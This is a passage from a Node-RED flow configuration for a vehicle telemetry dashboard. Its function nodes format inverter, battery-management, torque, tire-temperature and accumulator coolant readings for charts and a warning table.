        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1160,
        "y": 1000,
        "wires": [
            []
        ]
    },
    {
        "id": "1afb5881eb699eed",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Other Currents",
        "func": "var sigFigs = 2\n\nvar INV_DC_Bus_Current =\n{\n    topic: \"INV DC Bus Current (A)\",\n    payload: msg.payload.INV_DC_Bus_Current\n}\ntry {\n    INV_DC_Bus_Current.payload = INV_DC_Bus_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Diag_FW_Output =\n{\n    topic: \"INV Diag FW Output (A)\",\n    payload: msg.payload.INV_Diag_FW_Output\n}\ntry {\n    INV_Diag_FW_Output.payload = INV_Diag_FW_Output.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_DC_Bus_Current,\n    INV_Diag_FW_Output\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 1320,
        "wires": [
            [
                "1c785189828c06f4"
            ],
            [
                "1c785189828c06f4"
            ]
        ]
    },
    {
        "id": "73e319f2015a7131",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "f0725d664b53058d",
        "name": "Diag. Phase Currents",
        "label": "Diagnostic Phase",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1180,
        "y": 1160,
        "wires": [
            []
        ]
    },
    {
        "id": "b8c357acb2351c18",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "f0725d664b53058d",
        "name": "Commanded Currents",
        "label": "Commanded",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1180,
        "y": 1220,
        "wires": [
            []
        ]
    },
    {
        "id": "e6a0c47939c3055e",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "f0725d664b53058d",
        "name": "Max BMS current",
        "label": "BMS MAX charge/discharge",
        "order": 5,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1170,
        "y": 1280,
        "wires": [
            []
        ]
    },
    {
        "id": "4e10722b5264861a",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Max BMS Currents",
        "func": "var sigFigs = 2\n\nvar BMS_Max_Discharge_Current =\n{\n    topic: \"BMS Max Discharge Current (A)\",\n    payload: msg.payload.BMS_Max_Discharge_Current\n}\ntry {\n    BMS_Max_Discharge_Current.payload = BMS_Max_Discharge_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar BMS_Max_Charge_Current =\n{\n    topic: \"BMS Max Charge Current (A)\",\n    payload: msg.payload.BMS_Max_Charge_Current\n}\ntry {\n    BMS_Max_Charge_Current.payload = BMS_Max_Charge_Current.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    BMS_Max_Charge_Current,\n    BMS_Max_Discharge_Current\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 860,
        "y": 1280,
        "wires": [
            [
                "e6a0c47939c3055e"
            ],
            [
                "e6a0c47939c3055e"
            ]
        ]
    },
    {
        "id": "1c785189828c06f4",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "f0725d664b53058d",
        "name": "Other current",
        "label": "Other",
        "order": 6,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1150,
        "y": 1320,
        "wires": [
            []
        ]
    },
    {
        "id": "65f63b99ceb9a45c",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "52ac7a44f1b8043e",
        "name": "PWM Frequency",
        "label": "PWM Frequency",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Hz",
        "yAxisProperty": "INV_Diag_PWM_Freq",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 830,
        "y": 1420,
        "wires": [
            []
        ]
    },
    {
        "id": "f351e755d3dc9eb8",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Torques",
        "func": "var sigFigs = 2\n\nvar INV_Fast_Torque_Command =\n{\n    topic: \"INV Fast Torque Command (N*m)\",\n    payload: msg.payload.INV_Fast_Torque_Command\n}\ntry {\n    INV_Fast_Torque_Command.payload = INV_Fast_Torque_Command.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Torque_Feedback =\n{\n    topic: \"INV Fast Torque Feedback (N*m)\",\n    payload: msg.payload.INV_Fast_Torque_Feedback\n}\ntry {\n    INV_Fast_Torque_Feedback.payload = INV_Fast_Torque_Feedback.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Fast_Torque_Command,\n    INV_Fast_Torque_Feedback\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 820,
        "y": 1480,
        "wires": [
            [
                "98a1c79e54b83033"
            ],
            [
                "98a1c79e54b83033"
            ]
        ]
    },
    {
        "id": "98a1c79e54b83033",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "52ac7a44f1b8043e",
        "name": "Torque",
        "label": "Torques",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Nm",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1130,
        "y": 1480,
        "wires": [
            []
        ]
    },
    {
        "id": "dbc529a55d6f97b9",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "52ac7a44f1b8043e",
        "name": "Motor Angle (Electrical)",
        "label": "Motor Angle (electrical)",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Hz",
        "yAxisProperty": "INV_Motor_Angle_Electrical",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 850,
        "y": 1560,
        "wires": [
            []
        ]
    },
    {
        "id": "0eee0b6269880af3",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract other voltages",
        "func": "var sigFigs = 2\n\nvar INV_Output_Voltage =\n{\n    topic: \"INV Output Voltage (V)\",\n    payload: msg.payload.INV_Output_Voltage\n}\ntry {\n    INV_Output_Voltage.payload = INV_Output_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_DC_Bus_Voltage =\n{\n    topic: \"INV DC Bus Voltage (V)\",\n    payload: msg.payload.INV_DC_Bus_Voltage\n}\ntry {\n    INV_DC_Bus_Voltage.payload = INV_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Stall_Burst_Model_Temp =\n{\n    topic: \"INV Stall Burst Model Temperature (ºC)\",\n    payload: msg.payload.INV_Stall_Burst_Model_Temp\n}\ntry {\n    INV_Stall_Burst_Model_Temp.payload = INV_Stall_Burst_Model_Temp.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Diag_Vdc =\n{\n    topic: \"INV Diag Vdc (V)\",\n    payload: msg.payload.INV_Diag_Vdc\n}\ntry {\n    INV_Diag_Vdc.payload = INV_Diag_Vdc.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Diag_Vqs_Cmd =\n{\n    topic: \"INV Diag Vqs CMD (V)\",\n    payload: msg.payload.INV_Diag_Vqs_Cmd\n}\ntry {\n    INV_Diag_Vqs_Cmd.payload = INV_Diag_Vqs_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Fast_DC_Bus_Voltage =\n{\n    topic: \"INV Fast DC Bus Voltage (V)\",\n    payload: msg.payload.INV_Fast_DC_Bus_Voltage\n}\ntry {\n    INV_Fast_DC_Bus_Voltage.payload = INV_Fast_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Output_Voltage,\n    INV_DC_Bus_Voltage,\n    INV_Stall_Burst_Model_Temp,\n    INV_Diag_Vdc,\n    INV_Diag_Vqs_Cmd,\n    INV_Fast_DC_Bus_Voltage\n]",
        "outputs": 6,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 460,
        "wires": [
            [
                "cf9627f4954b5460"
            ],
            [
                "cf9627f4954b5460"
            ],
            [
                "cf9627f4954b5460"
            ],
            [
                "cf9627f4954b5460"
            ],
            [
                "cf9627f4954b5460"
            ],
            [
                "cf9627f4954b5460"
            ]
        ]
    },
    {
        "id": "cf9627f4954b5460",
        "type": "ui-chart",
        "z": "bda8997ed28d204b",
        "group": "a75d90dceee57537",
        "name": "Other Voltages",
        "label": "Other",
        "order": 5,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1100,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "afbd868a2bbbc4c0",
        "type": "comment",
        "z": "bda8997ed28d204b",
        "name": "TODO",
        "info": "Why is a temp signal part of other voltages?",
        "x": 750,
        "y": 420,
        "wires": []
    },
    {
        "id": "df145cc942dfed1a",
        "type": "ui-markdown",
        "z": "243a5262a5129260",
        "group": "a29bea42c7399403",
        "name": "",
        "order": 1,
        "width": 0,
        "height": 0,
        "content": "# Warning Source: {{msg?.payload.VCU_warningSource}}\n\n# General\n| Warning | Value |\n|-|-|\n| Pedal Plausibility Fault | {{msg?.payload.VCU_pedalPlausFaultWarning || 'Unknown' }} |\n| Tractive System Over Power | {{msg?.payload.VCU_tsOverPowerWarning || 'Unknown' }} |\n| Battery Under Voltage | {{msg?.payload.VCU_batteryUnderVoltWarning || 'Unknown' }} |\n\n\n# Radiator\n| Warning | Value |\n|-|-|\n| Coolant Temp Out | {{msg?.payload.VCU_radCoolantTempOutWarning || 'Unknown' }}|\n| Coolant Temp In | {{msg?.payload.VCU_radCoolantTempInWarning || 'Unknown' }} |\n| Coolant Pressure Out | {{msg?.payload.VCU_radCoolantPressOutWarning || 'Unknown' }} |\n| Coolant Pressure In | {{msg?.payload.VCU_radCoolantPressInWarning || 'Unknown' }} |\n| Coolant Flow Rate | {{msg?.payload.VCU_radCoolantFlowRateWarning || 'Unknown' }} |\n\n\n# Motor\n| Warning | Value |\n|-|-|\n| Torque Limit | {{msg?.payload.VCU_motorTorqueLimitWarning || 'Unknown' }} |\n| Speed Limit | {{msg?.payload.VCU_motorSpeedLimitWarning || 'Unknown' }} |\n| Over Voltage | {{msg?.payload.VCU_motorOverVoltWarning || 'Unknown' }} | \n| Over Speed | {{msg?.payload.VCU_motorOverSpeedWarning || 'Unknown' }} |\n| Over Current | {{msg?.payload.VCU_motorOverCurrentWarning || 'Unknown' }} |\n| Coolant Temp Out | {{msg?.payload.VCU_motorCoolantTempOutWarning || 'Unknown' }} |\n| Coolant Temp In | {{msg?.payload.VCU_motorCoolantTempInWarning || 'Unknown' }} |\n| Coolant Pressure Out | {{msg?.payload.VCU_motorCoolantPressOutWarning || 'Unknown' }} |\n| Coolant Pressure In | {{msg?.payload.VCU_motorCoolantPressInWarning || 'Unknown' }} |\n| Coolant Flow Rate | {{msg?.payload.VCU_motorCoolantFlowRateWarning || 'Unknown' }} |\n\n\n# Motor Controller\n| Warning | Value |\n|-|-|\n| Over Voltage | {{msg?.payload.VCU_mcOverVoltWarning || 'Unknown' }} |\n| Over Current | {{msg?.payload.VCU_mcOverCurrentWarning || 'Unknown' }} |\n| Coolant Temp Out | {{msg?.payload.VCU_mcCoolantTempOutWarning || 'Unknown' }} |\n| Coolant Temp In | {{msg?.payload.VCU_mcCoolantTempInWarning || 'Unknown' }} |\n| Coolant Pressure Out | {{msg?.payload.VCU_mcCoolantPressOutWarning || 'Unknown' }} |\n| Coolant Pressure In | {{msg?.payload.VCU_mcCoolantPressInWarning || 'Unknown' }} |\n| Coolant Flow Rate | {{msg?.payload.VCU_mcCoolantFlowRateWarning || 'Unknown' }} |\n| CAN Timeoute | {{msg?.payload.VCU_mcCANTimeoutWarning || 'Unknown' }} |\n\n\n# Accumulator\n| Warning | Value |\n|-|-|\n| Under Voltage | {{msg?.payload.VCU_accuUnderVoltWarning || 'Unknown' }} |\n| Over Voltage | {{msg?.payload.VCU_accuOverVoltWarning || 'Unknown' }} |\n| Over Current | {{msg?.payload.VCU_accuOverCurrentWarning || 'Unknown' }} |\n| Temperature | {{msg?.payload.VCU_accumulatorTempWarning || 'Unknown' }} |\n| IMD Light | {{msg?.payload.VCU_accuIMDLightWarning || 'Unknown' }} |\n| HVIL | {{msg?.payload.VCU_accuHVILWarning || 'Unknown' }} |\n| Coolant Temp Out | {{msg?.payload.VCU_accuCoolantTempOutWarning || 'Unknown' }} |\n| Coolant Temp In | {{msg?.payload.VCU_accuCoolantTempInWarning || 'Unknown' }} |\n| Coolant Pressure Out | {{msg?.payload.VCU_accuCoolantPressOutWarning || 'Unknown' }} |\n| Coolant Pressure In | {{msg?.payload.VCU_accuCoolantPressInWarning || 'Unknown' }} |\n| Coolant Flow Rate | {{msg?.payload.VCU_accuCoolantFlowRateWarning || 'Unknown' }} |\n| CAN Timeout | {{msg?.payload.VCU_accuCANTimeoutWarning || 'Unknown' }} |",
        "className": "",
        "x": 670,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "5fdce8d8e31cc4f4",
        "type": "websocket in",
        "z": "243a5262a5129260",
        "name": "",
        "server": "",
        "client": "b3e921438611f1ef",
        "x": 300,
        "y": 200,
        "wires": [
            [
                "fadaf0c2b9fef376"
            ]
        ]
    },
    {
        "id": "fadaf0c2b9fef376",
        "type": "json",
        "z": "243a5262a5129260",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 490,
        "y": 200,
        "wires": [
            [
                "df145cc942dfed1a"
            ]
        ]
    },
    {
        "id": "f18f48dd86415d89",
        "type": "function",
        "z": "5be5a18d72229f60",
        "name": "Extract Tire Temps",
        "func": "var sigFigs = 2\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar VCU_avgTireTempFL =\n{\n    topic: \"Average Front Left Tire Temp\",\n    payload: msg.payload.VCU_avgTireTempFL\n}\ntry {\n    VCU_avgTireTempFL.payload = VCU_avgTireTempFL.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_avgTireTempFR =\n{\n    topic: \"Average Front Right Tire Temp\",\n    payload: msg.payload.VCU_avgTireTempFR\n}\ntry {\n    VCU_avgTireTempFR.payload = VCU_avgTireTempFR.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_avgTireTempRL =\n{\n    topic: \"Average Rear Left Tire Temp\",\n    payload: msg.payload.VCU_avgTireTempRL\n}\ntry {\n    VCU_avgTireTempRL.payload = VCU_avgTireTempRL.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_avgTireTempRR =\n{\n    topic: \"Average Rear Right Tire Temp\",\n    payload: msg.payload.VCU_avgTireTempRR\n}\ntry {\n    VCU_avgTireTempRR.payload = VCU_avgTireTempRR.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_avgTireTempFL,\n    VCU_avgTireTempFR,\n    VCU_avgTireTempRL,\n    VCU_avgTireTempRR\n];\n",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 550,
        "y": 280,
        "wires": [
            [
                "fe7c922d824bbbd7"
            ],
            [
                "fe7c922d824bbbd7"
            ],
            [
                "fe7c922d824bbbd7"
            ],
            [
                "fe7c922d824bbbd7"
            ]
        ]
    },
    {
        "id": "261a0c0bd00b52cb",
        "type": "json",
        "z": "5be5a18d72229f60",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 330,
        "y": 280,
        "wires": [
            [
                "f18f48dd86415d89"
            ]
        ]
    },
    {
        "id": "2efe2fc43af427c4",
        "type": "websocket in",
        "z": "5be5a18d72229f60",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 130,
        "y": 280,
        "wires": [
            [
                "261a0c0bd00b52cb"
            ]
        ]
    },
    {
        "id": "fe7c922d824bbbd7",
        "type": "ui-chart",
        "z": "5be5a18d72229f60",
        "group": "9fb7817fd1a9e748",
        "name": "Tire Temps",
        "label": "Tire Temps",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": 1,
        "removeOlderUnit": "3600",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 850,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "0067134a32528805",
        "type": "websocket in",
        "z": "43c8977d5bb940cf",
        "name": "",
        "server": "",
        "client": "b3e921438611f1ef",
        "x": 120,
        "y": 780,
        "wires": [
            [
                "0d5d64c6effb30e8"
            ]
        ]
    },
    {
        "id": "0d5d64c6effb30e8",
        "type": "json",
        "z": "43c8977d5bb940cf",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 340,
        "y": 780,
        "wires": [
            [
                "b5aab0576cc8f0e7",
                "8e97520fd4f5b7ad",
                "1ad1d97c75f1c940",
                "da20fa25b8b42994",
                "8c1c49fb1985ec4f",
                "0b06e1d20ef1fc19",
                "6fd46876027cf460",
                "7f2a8d3384180cc8",
                "a835f73e7b959351",
                "cf9dc063f2044857",
                "e88b2bfae32741c1",
                "d00f087b201189a4",
                "e2e9406ea392a512"
            ]
        ]
    },
    {
        "id": "d76d0c9161ce70ce",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "58798ceaa3de3da9",
        "name": "(Accum) Pressure",
        "label": "Pressure",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "psi",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1210,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "b5aab0576cc8f0e7",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract Accum Pressures",
        "func": "var sigFigs = 2;\n\nvar VCU_accuCoolantPressOut =\n{\n    topic: \"Accumulator Coolant Pressure Out\",\n    payload: msg.payload.VCU_accuCoolantPressOut\n}\ntry {\n    VCU_accuCoolantPressOut.payload = VCU_accuCoolantPressOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressIn =\n{\n    topic: \"Accumulator Coolant Pressure In\",\n    payload: msg.payload.VCU_accuCoolantPressIn\n}\ntry {\n    VCU_accuCoolantPressIn.payload = VCU_accuCoolantPressIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressOutDiag =\n{\n    topic: \"Accumulator Coolant Pressure Out Diag\",\n    payload: msg.payload.VCU_accuCoolantPressOutDiag\n}\ntry {\n    VCU_accuCoolantPressOutDiag.payload = VCU_accuCoolantPressOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressInDiag =\n{\n    topic: \"Accumulator Coolant Pressure In Diag\",\n    payload: msg.payload.VCU_accuCoolantPressInDiag\n}\ntry {\n    VCU_accuCoolantPressInDiag.payload = VCU_accuCoolantPressInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_accuCoolantPressIn,\n    VCU_accuCoolantPressInDiag,\n    VCU_accuCoolantPressOut,\n    VCU_accuCoolantPressOutDiag\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 200,
        "wires": [
            [
                "d76d0c9161ce70ce"
            ],
            [
                "d76d0c9161ce70ce"
            ],
            [
                "d76d0c9161ce70ce"
            ],
            [
                "d76d0c9161ce70ce"
            ]
        ]
    },
    {
        "id": "8e97520fd4f5b7ad",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract Accum Temps",
        "func": "var sigFigs = 2;\n\nvar VCU_accuCoolantTempOut =\n{\n    topic: \"Accumulator Coolant Temperature Out\",\n    payload: msg.payload.VCU_accuCoolantTempOut\n}\ntry {\n    VCU_accuCoolantTempOut.payload = VCU_accuCoolantTempOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempIn =\n{\n    topic: \"Accumulator Coolant Temperature In\",\n    payload: msg.payload.VCU_accuCoolantTempIn\n}\ntry {\n    VCU_accuCoolantTempIn.payload = VCU_accuCoolantTempIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempOutDiag =\n{\n    topic: \"Accumulator Coolant Temperature Out Diag\",\n    payload: msg.payload.VCU_accuCoolantTempOutDiag\n}\ntry {\n    VCU_accuCoolantTempOutDiag.payload = VCU_accuCoolantTempOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempInDiag =\n{\n    topic: \"Accumulator Coolant Temperature In Diag\",\n    payload: msg.payload.VCU_accuCoolantTempInDiag\n}\ntry {\n    VCU_accuCoolantTempInDiag.payload = VCU_accuCoolantTempInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_accuCoolantTempIn,\n    